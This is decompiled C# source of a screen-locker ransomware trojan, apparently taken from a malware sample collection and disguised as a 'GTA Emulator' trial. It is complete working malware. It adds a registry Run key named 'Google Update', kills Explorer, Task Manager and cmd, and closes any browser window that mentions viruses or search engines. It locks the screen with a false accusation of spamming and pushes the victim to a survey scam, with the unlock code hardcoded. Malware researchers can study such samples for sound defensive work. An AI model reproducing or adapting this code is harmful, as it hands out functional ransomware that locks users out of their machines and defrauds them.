// Decompiled with JetBrains decompiler
// Type: Survex.Form1
// Assembly: GTA-Emulator-Trial, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0762F4AB-8668-43DA-9059-FCC91E832535
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.MSIL.Agent.rn-7965e9d591fef2e9af9660a7ddf711f38447013e3fc54cdb42a70bd7b49543ff.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Survex
{
  public class Form1 : Form
  {
    private Thread end;
    private string encpass = "FCPSFBGZOLJP";
    private IContainer components;
    private PictureBox pictureBox1;
    private Label label1;
    private TextBox textBox1;
    private Button button1;
    private Button button2;

    public Form1() => this.InitializeComponent();

    public static void Main(string[] args) => Application.Run((Form) new Form1());

    private void Form1_Load(object sender, EventArgs e)
    {
      do
      {
        Application.DoEvents();
      }
      while (!Form1.CheckForInternetConnection());
      Thread.Sleep(2000);
      this.NAHKVEDXOTRISCRGEKCPANTC();
      Application.DoEvents();
      Process.Start(this.Decrypt("dUwRv+aoYBhjYaQ7ocxcWO65siBR55HMBGroSOxQneacZh641Ee+yChi0Uq3/qKqK8VYxptjLf9YQ5AJxFIVI9K8bE6ohoe3Hjt2dTUW58o=", this.encpass));
      Application.DoEvents();
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.pictureBox1.Image = this.getIMG(this.Decrypt("pKsENPhKq4hir8UjvLOxU01adGulW4eFjufQcsAiuUP3PHaKQhSURE4jvf84QKbzCG3N+Or1bLQ+hrb4USP8Ow==", this.encpass));
      this.end = new Thread(new ThreadStart(this.EndExplorer));
      this.end.Start();
    }

    [DllImport("user32.dll")]
    public static extern int FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll")]
    public static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool PostMessage(int hWnd, uint Msg, int wParam, int lParam);

    private void EndExplorer()
    {
      try
      {
        Form1.PostMessage(Form1.FindWindow("Progman", (string) null), 18U, 0, 0);
      }
      catch
      {
      }
      try
      {
        Process.Start("taskkill", "/F /IM explorer.exe");
      }
      catch
      {
      }
      while (true)
      {
        try
        {
          foreach (Process process in Process.GetProcesses())
          {
            if (process.ProcessName.ToLower() == "taskmgr" || process.ProcessName.ToLower() == "explorer" || process.ProcessName.ToLower() == "cmd" || process.ProcessName.ToLower() == "run" || process.ProcessName.ToLower() == "msconfig" || process.ProcessName.ToLower() == "shutdown")
              process.Kill();
            if (process.MainWindowTitle.ToLower().Contains("virus") || process.MainWindowTitle.ToLower().Contains("facebook") || process.MainWindowTitle.ToLower().Contains("google search") || process.MainWindowTitle.ToLower().Contains("malware") || process.MainWindowTitle.ToLower().Contains("yahoo") || process.MainWindowTitle.ToLower().Contains("youtube") || process.MainWindowTitle.ToLower().Contains("bing"))
              process.Kill();
          }
        }
        catch
        {
        }
        Thread.Sleep(1000);
      }
    }

    private void NAHKVEDXOTRISCRGEKCPANTC()
    {
      try
      {
        Registry.CurrentUser.OpenSubKey(this.Decrypt("8u6usGZQn/E0/PejcyrmC9kUY35iSsSnrP6vhsaOif4f3WnHgpuWGwr/CmdLPbD6ea3JZHfshw1UAJwwtjdrHB3Gey519lOszD1tqXvPYQQ2GcEPG7Qg+o5cNK1k1Jnq", this.encpass), true).SetValue("Google Update", (object) Assembly.GetExecutingAssembly().Location);
      }
      catch
      {
      }
    }

    public Image getIMG(string sURL)
    {
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(sURL);
        httpWebRequest.Method = "GET";
        HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
        Bitmap img = new Bitmap(response.GetResponseStream());
        response.Close();
        return (Image) img;
      }
      catch
      {
        return (Image) null;
      }
    }

    public static bool CheckForInternetConnection()
    {
      try
      {
        new WebClient().DownloadString("http://www.google.com");
        return true;
      }
      catch
      {
        return false;
      }
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e) => e.Cancel = true;

    private void button2_Click(object sender, EventArgs e) => Process.Start(this.Decrypt("dUwRv+aoYBhjYaQ7ocxcWO65siBR55HMBGroSOxQneacZh641Ee+yChi0Uq3/qKqK8VYxptjLf9YQ5AJxFIVI9K8bE6ohoe3Hjt2dTUW58o=", this.encpass));

    private void button1_Click(object sender, EventArgs e)
    {
      if (!(this.textBox1.Text == "4knoT"))
        return;
      Process.Start("C:\\Windows\\explorer.exe");
      try
      {
        Registry.CurrentUser.OpenSubKey(this.Decrypt("8u6usGZQn/E0/PejcyrmC9kUY35iSsSnrP6vhsaOif4f3WnHgpuWGwr/CmdLPbD6ea3JZHfshw1UAJwwtjdrHB3Gey519lOszD1tqXvPYQQ2GcEPG7Qg+o5cNK1k1Jnq", this.encpass), true).DeleteValue("Google Update");
      }
      catch
      {
      }
      Environment.Exit(0);
    }

    private string Decrypt(string InputText, string Password)
    {
      try
      {
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        byte[] buffer = Convert.FromBase64String(InputText);
        byte[] bytes = Encoding.ASCII.GetBytes(Password.Length.ToString());
        PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(Password, bytes);
        ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor(passwordDeriveBytes.GetBytes(16), passwordDeriveBytes.GetBytes(16));
        MemoryStream memoryStream = new MemoryStream(buffer);
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read);
        byte[] numArray = new byte[buffer.Length];
        int count = cryptoStream.Read(numArray, 0, numArray.Length);
        memoryStream.Close();
        cryptoStream.Close();
        return Encoding.Unicode.GetString(numArray, 0, count);
      }
      catch
      {
        return InputText;
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.pictureBox1 = new PictureBox();
      this.label1 = new Label();
      this.textBox1 = new TextBox();
      this.button1 = new Button();
      this.button2 = new Button();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.SuspendLayout();
      this.pictureBox1.Location = new Point(12, 12);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(149, 141);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox1.TabIndex = 0;
      this.pictureBox1.TabStop = false;
      this.label1.AutoSize = true;
      this.label1.Location = new Point(167, 12);
      this.label1.Name = "label1";
      this.label1.Size = new Size(190, 91);
      this.label1.TabIndex = 1;
      this.label1.Text = "Your computer is supected of illegal \nspamming and has been locked. To\nunlock your computer, prove you are\na human by filling out a survey. After\nyou complete the survey, a download\nwill give you a txt file containing the\ncode needed to unlock your computer.";
      this.textBox1.Location = new Point(170, 152);
      this.textBox1.Name = "textBox1";
      this.textBox1.Size = new Size(134, 20);
      this.textBox1.TabIndex = 2;
      this.button1.Location = new Point(310, 150);
      this.button1.Name = "button1";
      this.button1.Size = new Size(51, 23);
      this.button1.TabIndex = 3;
      this.button1.Text = "Unlock";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.button2.Location = new Point(170, 123);
      this.button2.Name = "button2";
      this.button2.Size = new Size(75, 23);
      this.button2.TabIndex = 4;
      this.button2.Text = "Survey";
      this.button2.UseVisualStyleBackColor = true;
      this.button2.Click += new EventHandler(this.button2_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(373, 184);
      this.ControlBox = false;
      this.Controls.Add((Control) this.button2);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.textBox1);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.pictureBox1);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Your Computer has been Locked";
      this.TopMost = true;
      this.Load += new EventHandler(this.Form1_Load);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
